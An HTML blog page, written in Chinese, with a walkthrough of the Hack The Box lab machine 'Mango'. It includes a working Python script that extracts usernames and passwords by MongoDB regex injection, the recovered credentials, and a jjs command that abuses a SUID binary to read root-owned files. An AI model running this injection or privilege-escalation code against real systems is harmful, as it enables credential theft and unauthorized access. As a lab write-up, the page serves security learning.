@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="基础知识nosql注入 【mangodb】 https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;database&#x2F;95314.htmlhttps:&#x2F;&#x2F;github.com&#x2F;swisskyrepo&#x2F;PayloadsAllTheThings&#x2F;tree&#x2F;master&#x2F;NoSQL%20Injection#mongodb-payloads  jjsjjs是个基于Nashorn引擎的命令行工具。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-mango">
+<meta property="og:url" content="http://yoursite.com/2020/04/09/HTB-mango/index.html">
+<meta property="og:site_name" content="Tansz">
+<meta property="og:description" content="基础知识nosql注入 【mangodb】 https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;database&#x2F;95314.htmlhttps:&#x2F;&#x2F;github.com&#x2F;swisskyrepo&#x2F;PayloadsAllTheThings&#x2F;tree&#x2F;master&#x2F;NoSQL%20Injection#mongodb-payloads  jjsjjs是个基于Nashorn引擎的命令行工具。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200227115618576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200227122418458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200227122545394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200227124651840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2020-04-09T04:34:33.751Z">
+<meta property="article:modified_time" content="2020-04-09T04:34:42.855Z">
+<meta property="article:author" content="Tansz">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200227115618576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>HTB-mango</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/04/09/HTB-postman/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/04/09/HTB-nest/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/04/09/HTB-mango/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/04/09/HTB-mango/&text=HTB-mango" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/04/09/HTB-mango/&title=HTB-mango" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/04/09/HTB-mango/&is_video=false&description=HTB-mango" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-mango&body=Check out this article: http://yoursite.com/2020/04/09/HTB-mango/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/04/09/HTB-mango/&title=HTB-mango" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/04/09/HTB-mango/&title=HTB-mango" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/04/09/HTB-mango/&title=HTB-mango" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/04/09/HTB-mango/&title=HTB-mango" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/04/09/HTB-mango/&name=HTB-mango&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/04/09/HTB-mango/&t=HTB-mango" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#基础知识"><span class="toc-number">1.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nosql注入-【mangodb】"><span class="toc-number">1.1.</span> <span class="toc-text">nosql注入 【mangodb】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jjs"><span class="toc-number">1.2.</span> <span class="toc-text">jjs</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#端口扫描"><span class="toc-number">2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#信息收集"><span class="toc-number">3.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Nosql注入"><span class="toc-number">4.</span> <span class="toc-text">Nosql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#注入测试"><span class="toc-number">4.1.</span> <span class="toc-text">注入测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编写用户、密码爆破脚本"><span class="toc-number">4.2.</span> <span class="toc-text">编写用户、密码爆破脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#获得用户、密码"><span class="toc-number">4.3.</span> <span class="toc-text">获得用户、密码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSH-登录"><span class="toc-number">5.</span> <span class="toc-text">SSH 登录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#获得flag"><span class="toc-number">5.1.</span> <span class="toc-text">获得flag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#提权"><span class="toc-number">6.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集-1"><span class="toc-number">6.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用jjs进行文件读取"><span class="toc-number">6.2.</span> <span class="toc-text">使用jjs进行文件读取</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#脚本格式错误"><span class="toc-number">7.</span> <span class="toc-text">脚本格式错误</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HTB-mango
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Tansz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-04-09T04:34:33.751Z" itemprop="datePublished">2020-04-09</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="nosql注入-【mangodb】"><a href="#nosql注入-【mangodb】" class="headerlink" title="nosql注入 【mangodb】"></a>nosql注入 【mangodb】</h2><blockquote>
+<p><a href="https://www.freebuf.com/articles/database/95314.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/database/95314.html</a><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#mongodb-payloads" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#mongodb-payloads</a></p>
+</blockquote>
+<h2 id="jjs"><a href="#jjs" class="headerlink" title="jjs"></a>jjs</h2><p>jjs是个基于Nashorn引擎的命令行工具。它接受一些JavaScript源代码为参数，并且执行这些源代码</p>
+<blockquote>
+<p> <a href="https://gtfobins.github.io/gtfobins/jjs/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/jjs/</a></p>
+</blockquote>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)</span><br><span class="line">|_  256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)</span><br><span class="line">80&#x2F;tcp  open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">443&#x2F;tcp open  ssl&#x2F;ssl Apache httpd (SSL-only mode)</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: 400 Bad Request</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;staging-order.mango.htb&#x2F;organizationName&#x3D;Mango Prv Ltd.&#x2F;stateOrProvinceName&#x3D;None&#x2F;countryName&#x3D;IN</span><br><span class="line">| Not valid before: 2019-09-27T14:21:19</span><br><span class="line">|_Not valid after:  2020-09-26T14:21:19</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http&#x2F;1.1</span><br></pre></td></tr></table></figure>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>浏览站点，没有可用信息<br>发现端口扫描中有个<strong>commonName=staging-order.mango.htb</strong>字段，加入到<strong>/etc/hosts</strong>中，浏览站点。<br><img src="https://img-blog.csdnimg.cn/20200227115618576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>如何发现这是nosql注入的攻击点呢———-只能说是经验之谈了</p>
+<h1 id="Nosql注入"><a href="#Nosql注入" class="headerlink" title="Nosql注入"></a>Nosql注入</h1><p>发现是mango联想到mangodb</p>
+<h2 id="注入测试"><a href="#注入测试" class="headerlink" title="注入测试"></a>注入测试</h2><p><img src="https://img-blog.csdnimg.cn/20200227122418458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227122545394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="编写用户、密码爆破脚本"><a href="#编写用户、密码爆破脚本" class="headerlink" title="编写用户、密码爆破脚本"></a>编写用户、密码爆破脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">#conding&#x3D;utf-8</span><br><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;staging-order.mango.htb&#x2F;index.php&quot;</span><br><span class="line">Cookie &#x3D; &#123;&quot;PHPSESSID&quot; : &quot;junr7pn15rsibkd4q7fjtnrfj7&quot;&#125;</span><br><span class="line">headers &#x3D; &#123;&quot;Host&quot;: &quot;staging-order.mango.htb&quot;&#125;</span><br><span class="line">possible_chars &#x3D; list(string.ascii_letters)+list(string.digits)+[&quot;\\&quot;+c for c in string.punctuation+string.whitespace]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_password(name):</span><br><span class="line">    print(&quot;Using &quot;+name+&quot; found password&quot;)</span><br><span class="line">    password &#x3D; &quot;^&quot;</span><br><span class="line">    param &#x3D; &#123;&quot;username[$regex]&quot;: name, &quot;password[$regex]&quot;: &quot;&quot;, &quot;login&quot;: &quot;login&quot;&#125;</span><br><span class="line">    while True:</span><br><span class="line">        for char in possible_chars:</span><br><span class="line">            param[&quot;password[$regex]&quot;] &#x3D; password + char + &quot;.*&quot;</span><br><span class="line">            res &#x3D; requests.post(url&#x3D;url, data&#x3D;param, headers&#x3D;headers, cookies&#x3D;Cookie, allow_redirects&#x3D;False)</span><br><span class="line">            if int(res.status_code) &#x3D;&#x3D; 302:   </span><br><span class="line">                password +&#x3D; char			# 匹配成功则拼接字符，继续匹配下个字符</span><br><span class="line">                break</span><br><span class="line">        if char &#x3D;&#x3D; possible_chars[-1]:</span><br><span class="line">            print(&quot;Username &quot;+name+&quot; password &quot; + password[1:].replace(&quot;\\&quot;, &quot;&quot;))</span><br><span class="line">    		return password[1:].replace(&quot;\\&quot;, &quot;&quot;)   #剔除转移字符  \ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_name():</span><br><span class="line">    usernames &#x3D; []</span><br><span class="line">    param &#x3D; &#123;&quot;username[$regex]&quot;: &quot;&quot;, &quot;password[$regex]&quot;: &quot;.*&quot;, &quot;login&quot;: &quot;login&quot;&#125;</span><br><span class="line">    for char in possible_chars:</span><br><span class="line">        username &#x3D; &quot;^&quot; + char    </span><br><span class="line">        param[&quot;username[$regex]&quot;] &#x3D; username + &quot;.*&quot;    # 如^a.*，匹配a开头的任意长度字符 </span><br><span class="line">        res &#x3D; requests.post(url&#x3D;url, data&#x3D;param, headers&#x3D;headers, cookies&#x3D;Cookie, allow_redirects&#x3D;False)</span><br><span class="line">        if int(res.status_code) &#x3D;&#x3D; 302:					# 如果该字符匹配成功继续匹配之后的字符</span><br><span class="line">            print(&quot;username start with&quot; + username)</span><br><span class="line">            while True:</span><br><span class="line">                for char2 in possible_chars:</span><br><span class="line">                    param[&quot;username[$regex]&quot;] &#x3D; username + char2 + &quot;.*&quot;</span><br><span class="line">                    res2 &#x3D; requests.post(url&#x3D;url, data&#x3D;param, headers&#x3D;headers, cookies&#x3D;Cookie, allow_redirects&#x3D;False)</span><br><span class="line">                    if int(res2.status_code) &#x3D;&#x3D; 302:		#匹配成功则继续匹配，否则更换字符进行匹配</span><br><span class="line">                        username &#x3D; username + char2</span><br><span class="line">                        print(username)</span><br><span class="line">                        break</span><br><span class="line">                if char2 &#x3D;&#x3D; possible_chars[-1]:    # 匹配到最后一个字符，说明匹配完成</span><br><span class="line">                    print(&quot;Found username &quot; + username[1:])</span><br><span class="line">                    usernames.append(username[1:])  </span><br><span class="line">                    break</span><br><span class="line">  return usernames</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for name in get_name():</span><br><span class="line">	t1 &#x3D; threading.Thread(target&#x3D;get_password,args&#x3D;(name,))</span><br><span class="line">	t1.start()</span><br></pre></td></tr></table></figure>
+<h2 id="获得用户、密码"><a href="#获得用户、密码" class="headerlink" title="获得用户、密码"></a>获得用户、密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin   t9KcS3&gt;!0B#2</span><br><span class="line">mango   h3mXK8RhU~f&#123;]f5H</span><br></pre></td></tr></table></figure>
+
+<h1 id="SSH-登录"><a href="#SSH-登录" class="headerlink" title="SSH 登录"></a>SSH 登录</h1><p>admin无法直接登录，使用mango登录成功<br>在mango目录下没有flag，在admin目录下发现flag<br>转到admin用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mango@mango:&#x2F;home&#x2F;admin$ ls</span><br><span class="line">user.txt</span><br><span class="line">mango@mango:&#x2F;home&#x2F;admin$ su admin</span><br><span class="line">Password:</span><br></pre></td></tr></table></figure>
+<h2 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ whoami</span><br><span class="line">admin</span><br><span class="line">$ wc -c user.txt</span><br><span class="line">33 user.txt</span><br></pre></td></tr></table></figure>
+
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ find &#x2F; -user root -perm -4000 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200227124651840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现jjs</p>
+<h2 id="使用jjs进行文件读取"><a href="#使用jjs进行文件读取" class="headerlink" title="使用jjs进行文件读取"></a>使用jjs进行文件读取</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;var BufferedReader &#x3D; Java.type(&quot;java.io.BufferedReader&quot;);</span><br><span class="line">var FileReader &#x3D; Java.type(&quot;java.io.FileReader&quot;);</span><br><span class="line">var br &#x3D; new BufferedReader(new FileReader(&quot;**&#x2F;root&#x2F;root.txt**&quot;));</span><br><span class="line">while ((line &#x3D; br.readLine()) !&#x3D; null) &#123; print(line); &#125;&#39; | jjs</span><br></pre></td></tr></table></figure>
+
+<h1 id="脚本格式错误"><a href="#脚本格式错误" class="headerlink" title="脚本格式错误"></a>脚本格式错误</h1><p>在windows下编写脚本，复制到linux下，报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">因为这个文件是直接从别处复制的，可能创建在windows下，多了\r字符。</span><br><span class="line">解决方法</span><br><span class="line">使用VIM打开文本</span><br><span class="line">:set ff 然后回车，我这个文件显示为dos格式。</span><br><span class="line">:set ff&#x3D;unix 回车，设置为unix格式。</span><br><span class="line">:wq</span><br></pre></td></tr></table></figure>
+
+
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#基础知识"><span class="toc-number">1.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nosql注入-【mangodb】"><span class="toc-number">1.1.</span> <span class="toc-text">nosql注入 【mangodb】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jjs"><span class="toc-number">1.2.</span> <span class="toc-text">jjs</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#端口扫描"><span class="toc-number">2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#信息收集"><span class="toc-number">3.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Nosql注入"><span class="toc-number">4.</span> <span class="toc-text">Nosql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#注入测试"><span class="toc-number">4.1.</span> <span class="toc-text">注入测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编写用户、密码爆破脚本"><span class="toc-number">4.2.</span> <span class="toc-text">编写用户、密码爆破脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#获得用户、密码"><span class="toc-number">4.3.</span> <span class="toc-text">获得用户、密码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSH-登录"><span class="toc-number">5.</span> <span class="toc-text">SSH 登录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#获得flag"><span class="toc-number">5.1.</span> <span class="toc-text">获得flag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#提权"><span class="toc-number">6.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集-1"><span class="toc-number">6.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用jjs进行文件读取"><span class="toc-number">6.2.</span> <span class="toc-text">使用jjs进行文件读取</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#脚本格式错误"><span class="toc-number">7.</span> <span class="toc-text">脚本格式错误</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/04/09/HTB-mango/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/04/09/HTB-mango/&text=HTB-mango" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/04/09/HTB-mango/&title=HTB-mango" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/04/09/HTB-mango/&is_video=false&description=HTB-mango" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-mango&body=Check out this article: http://yoursite.com/2020/04/09/HTB-mango/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/04/09/HTB-mango/&title=HTB-mango" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/04/09/HTB-mango/&title=HTB-mango" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/04/09/HTB-mango/&title=HTB-mango" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/04/09/HTB-mango/&title=HTB-mango" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/04/09/HTB-mango/&name=HTB-mango&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/04/09/HTB-mango/&t=HTB-mango" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
